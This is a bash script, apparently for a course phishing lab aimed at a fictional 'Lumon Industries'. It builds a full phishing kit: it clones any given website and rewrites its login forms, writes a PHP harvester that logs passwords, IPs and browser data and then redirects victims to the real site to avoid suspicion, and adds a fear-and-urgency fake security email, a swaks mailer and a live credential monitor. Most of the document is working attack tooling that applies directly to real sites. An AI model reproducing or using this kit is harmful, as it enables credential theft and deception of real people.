#!/bin/bash
# Phishing Lab Setup Script

# Set text colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Display banner
echo -e "${YELLOW}"
echo "╔═════════════════════════════════════════════════╗"
echo "║                                                 ║"
echo "║         PHISHING LAB SETUP SCRIPT               ║"
echo "║                                                 ║"
echo "╚═════════════════════════════════════════════════╝"
echo -e "${NC}"

# Parse command line arguments
TARGET_URL=""
if [ $# -ge 1 ]; then
    TARGET_URL="$1"
    echo -e "${YELLOW}[INFO]${NC} Website to clone: $TARGET_URL"
fi

# Check if running as root (needed for port 80)
if [ "$EUID" -ne 0 ]; then
  echo -e "${YELLOW}[INFO]${NC} This script should ideally be run with sudo for port 80 access."
fi

# Function to check if a command was successful
check_status() {
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[SUCCESS]${NC} $1"
    else
        echo -e "${RED}[FAILED]${NC} $1"
        echo "Please check the error message above."
        exit 1
    fi
}

# Ensure .env file exists
if [ ! -f .env ]; then
    echo -e "${RED}[ERROR]${NC} .env file not found. Please create it from .env.example"
    echo -e "Run: cp .env.example .env && nano .env"
    exit 1
fi

# Load environment variables
echo -e "${YELLOW}[INFO]${NC} Loading configuration from .env file..."
source .env
check_status "Loaded configuration"

# Check for required variables
if [ -z "$EMAIL_USERNAME" ] || [ -z "$EMAIL_PASSWORD" ] || [ -z "$SERVER_IP" ]; then
    echo -e "${RED}[ERROR]${NC} Required variables missing in .env file."
    exit 1
fi

# Install dependencies
echo -e "${YELLOW}[INFO]${NC} Checking and installing dependencies..."

# Check for PHP
if ! command -v php &> /dev/null; then
    echo -e "${YELLOW}[INFO]${NC} Installing PHP..."
    sudo apt update
    sudo apt install -y php
    check_status "Installed PHP"
fi

# Check for swaks (for email sending)
if ! command -v swaks &> /dev/null; then
    echo -e "${YELLOW}[INFO]${NC} Installing swaks..."
    sudo apt update
    sudo apt install -y swaks
    check_status "Installed swaks"
fi

# Check for wget (for website cloning)
if ! command -v wget &> /dev/null; then
    echo -e "${YELLOW}[INFO]${NC} Installing wget..."
    sudo apt update
    sudo apt install -y wget
    check_status "Installed wget"
fi

# Create directories
echo -e "${YELLOW}[INFO]${NC} Creating directory structure..."
mkdir -p phishing_site
check_status "Created directories"

# Create phishing site files
echo -e "${YELLOW}[INFO]${NC} Setting up phishing website..."

# Decide whether to clone a website or use the default template
if [ -n "$TARGET_URL" ]; then
    echo -e "${YELLOW}[INFO]${NC} Cloning website from $TARGET_URL..."
    
    # Create a temporary directory for cloning
    TEMP_DIR=$(mktemp -d)
    
    # Clone the website
    cd "$TEMP_DIR"
    wget --mirror --convert-links --adjust-extension --page-requisites --no-parent -P . "$TARGET_URL" 2>/dev/null
    check_status "Downloaded website content"
    
    # Find the main index file
    MAIN_INDEX=$(find . -name "index.html" | head -n 1)
    
    if [ -z "$MAIN_INDEX" ]; then
        echo -e "${YELLOW}[WARNING]${NC} No index.html found. Looking for other main pages..."
        MAIN_INDEX=$(find . -name "*.html" | head -n 1)
    fi
    
    if [ -z "$MAIN_INDEX" ]; then
        echo -e "${RED}[ERROR]${NC} Couldn't find any HTML files in the cloned website."
        echo -e "${YELLOW}[INFO]${NC} Using default login page instead."
        USE_DEFAULT=true
    else
        # Copy the cloned website to the phishing_site directory
        cp -r "$TEMP_DIR"/* phishing_site/
        
        # Modify the form action to point to credentials.php
        MAIN_INDEX_PATH="phishing_site/$(echo $MAIN_INDEX | sed 's|^\./||')"
        echo -e "${YELLOW}[INFO]${NC} Modifying form in $MAIN_INDEX_PATH to capture credentials..."
        
        # Find and modify the first form in the HTML file
        sed -i 's|<form[^>]*action="[^"]*"|<form action="credentials.php"|g' "$MAIN_INDEX_PATH"
        sed -i 's|<form[^>]*>|<form action="credentials.php" method="post">|g' "$MAIN_INDEX_PATH"
        
        # Clean up
        rm -rf "$TEMP_DIR"
        
        echo -e "${GREEN}[SUCCESS]${NC} Website cloned and modified for credential harvesting"
    fi
else
    echo -e "${YELLOW}[INFO]${NC} No URL provided. Using default login page."
    USE_DEFAULT=true
fi

# Create default phishing login page if needed
if [ "$USE_DEFAULT" = true ]; then
    cat > phishing_site/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Lumon Industries - Employee Portal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 350px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img {
            width: 200px;
        }
        h2 {
            text-align: center;
            color: #003366;
            margin-bottom: 20px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input {
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            padding: 12px;
            background-color: #003366;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #002244;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://via.placeholder.com/200x60?text=Lumon+Industries" alt="Lumon Industries">
        </div>
        <h2>Employee Portal Login</h2>
        <form action="credentials.php" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="footer">
            &copy; 2023 Lumon Industries. All rights reserved.
        </div>
    </div>
</body>
</html>
EOF
    check_status "Created default phishing login page"
fi

# Create credential harvesting script
cat > phishing_site/credentials.php << 'EOF'
<?php
// Log file to store captured credentials
$log_file = 'captured_credentials.txt';

// Get the current date and time
$date = date('Y-m-d H:i:s');

// Get the visitor's IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Get the user agent (browser info)
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Get the referer URL (where they came from)
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Unknown';

// Initialize credential variables
$username = '';
$password = '';

// Check for POST data (form submission)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Try to capture any credentials regardless of field names
    foreach ($_POST as $key => $value) {
        // Look for common username/email field names
        if (stripos($key, 'user') !== false || 
            stripos($key, 'email') !== false || 
            stripos($key, 'login') !== false || 
            stripos($key, 'id') !== false || 
            stripos($key, 'account') !== false) {
            $username = $value;
        }
        
        // Look for common password field names
        if (stripos($key, 'pass') !== false || 
            stripos($key, 'pwd') !== false || 
            stripos($key, 'secret') !== false) {
            $password = $value;
        }
    }
    
    // If we didn't find specific fields, log all POST data
    $all_post_data = '';
    if (empty($username) && empty($password)) {
        foreach ($_POST as $key => $value) {
            $all_post_data .= "$key: $value\n";
            
            // Make a best guess about which fields might be username/password
            if (empty($username) && !empty($value)) {
                $username = $value; // First non-empty value might be username
                continue;
            }
            if (empty($password) && !empty($value) && $value != $username) {
                $password = $value; // Second non-empty value might be password
            }
        }
    }
    
    // Format log entry
    $log_entry = "==================================\n";
    $log_entry .= "Date: $date\n";
    $log_entry .= "IP Address: $ip\n";
    $log_entry .= "User Agent: $user_agent\n";
    $log_entry .= "Referer: $referer\n";
    $log_entry .= "Username/Email: $username\n";
    $log_entry .= "Password: $password\n";
    
    if (!empty($all_post_data)) {
        $log_entry .= "\nAll POST data:\n$all_post_data";
    }
    
    $log_entry .= "==================================\n\n";
    
    // Write to log file
    file_put_contents($log_file, $log_entry, FILE_APPEND);
    
    // Redirect to a legitimate site (to avoid suspicion)
    header('Location: https://portal.lumoninc.com');
    exit;
}
?>
EOF
check_status "Created enhanced credential harvesting script"

# Create web server start script
cat > phishing_site/start_server.sh << 'EOF'
#!/bin/bash

# Set text colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[INFO]${NC} Starting PHP web server..."

if [ "$EUID" -ne 0 ]; then
    echo -e "${YELLOW}[WARNING]${NC} Not running as root. If port 80 fails, try: sudo ./start_server.sh"
fi

# Try port 80 first, fallback to 8080 if needed
echo -e "${YELLOW}[INFO]${NC} Attempting to start on port 80..."
php -S 0.0.0.0:80 2>/dev/null || {
    echo -e "${YELLOW}[INFO]${NC} Port 80 failed, trying port 8080..."
    php -S 0.0.0.0:8080
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[SUCCESS]${NC} Server running on port 8080"
        echo -e "${YELLOW}[WARNING]${NC} Using port 8080 instead of 80! Update your phishing links!"
    else
        echo -e "${RED}[FAILED]${NC} Could not start PHP server"
        exit 1
    fi
}
EOF
chmod +x phishing_site/start_server.sh
check_status "Created web server script"

# Create credentials viewing script
cat > view_credentials.sh << 'EOF'
#!/bin/bash

# Set text colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[INFO]${NC} Monitoring for captured credentials. Press Ctrl+C to stop."

CREDS_FILE="phishing_site/captured_credentials.txt"

if [ ! -f "$CREDS_FILE" ]; then
    echo -e "${YELLOW}[INFO]${NC} Creating credentials file..."
    touch "$CREDS_FILE"
fi

echo -e "${YELLOW}[INFO]${NC} Waiting for victims to enter their credentials..."
tail -f "$CREDS_FILE"
EOF
chmod +x view_credentials.sh
check_status "Created credentials viewing script"

# Create HTML email template
cat > html_email_template.html << EOF
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Urgent: Account Security Verification Required</title>
</head>
<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; line-height: 1.6;">
    <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px; border-collapse: collapse;">
        <!-- HEADER WITH LOGO -->
        <tr>
            <td align="center" bgcolor="#003366" style="padding: 20px 0;">
                <img src="https://via.placeholder.com/180x60?text=Lumon+Industries" alt="Lumon Industries" width="180" style="display: block;">
            </td>
        </tr>
        
        <!-- CONTENT AREA -->
        <tr>
            <td bgcolor="#ffffff" style="padding: 40px 30px;">
                <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tr>
                        <td style="color: #153643; font-size: 24px; font-weight: bold;">
                            Urgent: Security Alert - Immediate Action Required
                        </td>
                    </tr>
                    <tr>
                        <td style="padding: 20px 0;">
                            <p>Dear Valued Employee,</p>
                            
                            <p>The IT Security department has detected multiple unauthorized access attempts on your company account. According to our logs, these attempts originated from an unrecognized device.</p>
                            
                            <p>As part of our updated security protocols, <strong>you must verify your account credentials within the next 24 hours</strong> to maintain access to all Lumon Industries systems.</p>
                            
                            <p>This verification is mandatory according to our new company-wide security policy.</p>
                        </td>
                    </tr>
                    <tr>
                        <td align="center" style="padding: 30px 0;">
                            <table border="0" cellpadding="0" cellspacing="0">
                                <tr>
                                    <td align="center" bgcolor="#003366" style="border-radius: 4px;">
                                        <a href="http://${SERVER_IP}" target="_blank" style="display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;">Verify Account Now</a>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <p>If you did not attempt to access your account, please complete the verification process immediately and then contact the IT Security team at security@mail.lumoninc.com.</p>
                            
                            <p>Failure to verify your account within the specified timeframe may result in temporary account suspension until proper identity verification can be completed.</p>
                            
                            <p>Thank you for your prompt attention to this matter.</p>
                            
                            <p>Regards,<br>
                            Lumon Industries IT Security Team</p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
        
        <!-- FOOTER -->
        <tr>
            <td bgcolor="#f4f4f4" style="padding: 20px 30px;">
                <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tr>
                        <td style="color: #666666; font-size: 12px;">
                            <p>This message contains confidential information and is intended only for the recipient. If you are not the intended recipient, you should not disseminate, distribute or copy this email. Please notify the sender immediately if you have received this email by mistake and delete it from your system.</p>
                            <p>&copy; 2023 Lumon Industries. All rights reserved.</p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>
EOF
check_status "Created HTML email template"

# Create the email sending script
cat > send_email.sh << 'EOF'
#!/bin/bash

# Set text colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Display banner
echo -e "${YELLOW}"
echo "╔═════════════════════════════════════════════════╗"
echo "║                                                 ║"
echo "║         PHISHING EMAIL SENDER                   ║"
echo "║                                                 ║"
echo "╚═════════════════════════════════════════════════╝"
echo -e "${NC}"

# Load environment variables
source .env

# Check if target email is set, otherwise use self
if [ -z "$TARGET_EMAIL" ]; then
    TARGET_EMAIL="$EMAIL_USERNAME"
    echo -e "${YELLOW}[INFO]${NC} No target specified in .env, sending to yourself: $TARGET_EMAIL"
fi

# Send email using swaks
echo -e "${YELLOW}[INFO]${NC} Sending email using swaks..."
swaks --to "$TARGET_EMAIL" \
      --from "$EMAIL_USERNAME" \
      --server mail.lumoninc.com \
      --port 25 \
      --auth-user "$EMAIL_USERNAME" \
      --auth-password "$EMAIL_PASSWORD" \
      --h-Subject "Urgent: Security Alert - Immediate Action Required" \
      --body "$(cat html_email_template.html)"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[SUCCESS]${NC} Email sent successfully to $TARGET_EMAIL"
else
    echo -e "${RED}[FAILED]${NC} Failed to send email with swaks."
    echo -e "${YELLOW}[INFO]${NC} Check your email credentials and connectivity."
fi

# Provide info for manual testing
echo -e "${YELLOW}[INFO]${NC} For manual email testing, use these settings:"
echo -e "    SMTP Server: mail.lumoninc.com"
echo -e "    Port: 25"
echo -e "    Username: $EMAIL_USERNAME"
echo -e "    Password: (your password in .env)"
echo -e "    Security: None"
EOF
chmod +x send_email.sh
check_status "Created email sending script"

# Update the README with information about URL cloning
cat > clone_website_info.txt << 'EOF'
# Website Cloning Feature

This phishing lab now supports cloning real websites by passing a URL as a command line argument:

## Usage

```bash
# To use the default phishing page:
./setup.sh

# To clone a specific website:
./setup.sh https://example.com
```

When cloning a website:
1. The script downloads the website content using wget
2. It locates the main index.html file 
3. It modifies any forms to submit to credentials.php
4. The cloned content is placed in the phishing_site directory

## Tips for Effective Cloning

- Choose simpler websites with fewer external dependencies
- Target login pages directly rather than entire websites
- Test the cloned site thoroughly before using it in a phishing email
- You may need to manually adjust some forms if automatic detection fails

## Troubleshooting

If website cloning fails, the script will fall back to the default login page.
Common issues include:
- Complex website structure that doesn't clone well with wget
- JavaScript-based forms that require additional modifications
- Missing resources or relative path issues

For best results, you might need to manually inspect and adjust the cloned files.
EOF
check_status "Created website cloning documentation"

# Update README to include cloning info
echo -e "${YELLOW}[INFO]${NC} Updating README with cloning information..."
if [ -f "README.md" ]; then
    # Add a note about cloning feature to the README
    sed -i '/## Step-by-Step Instructions/a \n**Website Cloning:** You can now clone real websites by passing a URL: `./setup.sh https://example.com`\n' README.md
    check_status "Updated README with cloning information"
fi

# Create lab report template
cat > lab_report_template.md << 'EOF'
# Email Phishing Lab Report

## Student Information
- **Name:** [YOUR NAME]
- **Student ID:** [YOUR ID]
- **Date:** [DATE OF COMPLETION]

## 1. Phishing Approach

### Email Content Strategy
I crafted a phishing email that appeared to come from the Lumon Industries IT Security team. The email claimed that unauthorized access attempts had been detected on the recipient's account and required them to verify their credentials immediately.

Key psychological tactics used:
- **Urgency:** Mentioned a 24-hour deadline to create time pressure
- **Fear:** Implied security threat to the user's account
- **Authority:** Posed as the IT Security team with official formatting
- **Consequence:** Stated account suspension would occur if action wasn't taken

### Technical Implementation
I used the following tools to execute the phishing campaign:
- **Website Cloning:** Created a convincing replica of the Lumon Industries employee portal
- **Credential Harvesting:** Implemented a PHP script to capture and log submitted credentials
- **Email Delivery:** Configured an email client to send HTML-formatted emails through the Lumon mail server

## 2. Technical Implementation

### Server Configuration
The phishing website was hosted on a server with IP address: [YOUR_SERVER_IP]

The web server was configured to:
- Host the cloned login page
- Process form submissions through the credential harvesting script
- Log captured information to a text file
- Redirect victims to the legitimate site after capturing credentials

### Email Configuration
I configured the email account with the following settings:
- **SMTP Server:** mail.lumoninc.com
- **Port:** 25
- **Username:** [YOUR_EMAIL_USERNAME]
- **Authentication:** Normal password

## 3. Results and Analysis

### Victim Interaction
The target received and opened the phishing email at [TIME]. They clicked the link and were directed to the phishing site, where they entered their credentials.

### Captured Data
The following credentials were successfully captured:
- **Username:** [CAPTURED_USERNAME]
- **Password:** [CAPTURED_PASSWORD]
- **Timestamp:** [CAPTURE_TIME]
- **IP Address:** [VICTIM_IP]
- **User Agent:** [BROWSER_INFO]

## 4. Challenges and Solutions

During the execution of this lab, I encountered the following challenges:

1. **Challenge:** [DESCRIBE_CHALLENGE]
   **Solution:** [EXPLAIN_SOLUTION]

2. **Challenge:** [DESCRIBE_CHALLENGE]
   **Solution:** [EXPLAIN_SOLUTION]

## 5. Effectiveness Analysis

The phishing attempt was successful due to several factors:
- The email appeared legitimate with proper formatting and branding
- The urgency created by the security alert prompted immediate action
- The cloned website was visually identical to the legitimate portal
- The redirection to the real site after credential capture prevented suspicion

Areas for improvement:
- [AREA_FOR_IMPROVEMENT]
- [AREA_FOR_IMPROVEMENT]

## 6. Security Implications and Prevention

This exercise demonstrated how easily users can be manipulated into revealing sensitive information. To prevent such attacks:

- Implement multi-factor authentication
- Train users to verify email sender addresses
- Encourage verification through official channels rather than email links
- Use email filtering to detect phishing attempts

## 7. Screenshots

### Phishing Email
[INSERT_EMAIL_SCREENSHOT_HERE]

### Cloned Website
[INSERT_WEBSITE_SCREENSHOT_HERE]

### Captured Credentials
[INSERT_CREDENTIALS_LOG_SCREENSHOT_HERE]

## 8. Conclusion

This lab effectively demonstrated the end-to-end process of executing a phishing attack, from crafting persuasive content to technical implementation and credential capture. It highlights the importance of user education and technical controls in preventing such attacks in real-world environments.
EOF
check_status "Created lab report template"

# Create a quick reference command sheet
cat > commands_cheatsheet.txt << 'EOF'
# PHISHING LAB QUICK REFERENCE COMMANDS

## Setup
# Setup with default login page
./setup.sh

# Setup with cloned website
./setup.sh https://example.com

# Make scripts executable
chmod +x *.sh phishing_site/*.sh

## Start the web server (in one terminal)
cd phishing_site
sudo ./start_server.sh

## Send the phishing email (in another terminal)
./send_email.sh

## Monitor for credentials (in a third terminal)
./view_credentials.sh

## Check for captured credentials
cat phishing_site/captured_credentials.txt

## View the HTML email template
less html_email_template.html

## IMAP settings for checking mail
# Server: mail.lumoninc.com
# Port: 143
# Username: sXXX@mail.lumoninc.com (from .env)
# Security: None

## Email testing with telnet
telnet mail.lumoninc.com 143
a LOGIN username password
a SELECT INBOX
a FETCH 1 BODY[]
EOF
check_status "Created command cheatsheet"

# Final setup and verification
echo -e "${YELLOW}[INFO]${NC} Setting executable permissions..."
chmod +x *.sh phishing_site/*.sh
check_status "Set executable permissions"

# Print success message
echo -e "${GREEN}\n===================================================${NC}"
echo -e "${GREEN}Setup Complete! Quick start instructions:${NC}"
echo -e "${GREEN}===================================================${NC}"
if [ -n "$TARGET_URL" ]; then
    echo -e "${GREEN}Website cloned:${NC} $TARGET_URL"
else
    echo -e "${GREEN}Using default login page${NC}"
fi
echo -e ""
echo -e "1. Start the web server:${NC}"
echo -e "   ${YELLOW}cd phishing_site && sudo ./start_server.sh${NC}"
echo -e ""
echo -e "2. Send the phishing email (in a new terminal):${NC}"
echo -e "   ${YELLOW}./send_email.sh${NC}"
echo -e ""
echo -e "3. Monitor for captured credentials (in another terminal):${NC}"
echo -e "   ${YELLOW}./view_credentials.sh${NC}"
echo -e ""
echo -e "${GREEN}Your phishing site is configured with your IP: ${YELLOW}${SERVER_IP}${NC}"
echo -e "${GREEN}Your email will be sent from: ${YELLOW}${EMAIL_USERNAME}${NC}"
echo -e "${GREEN}===================================================${NC}" 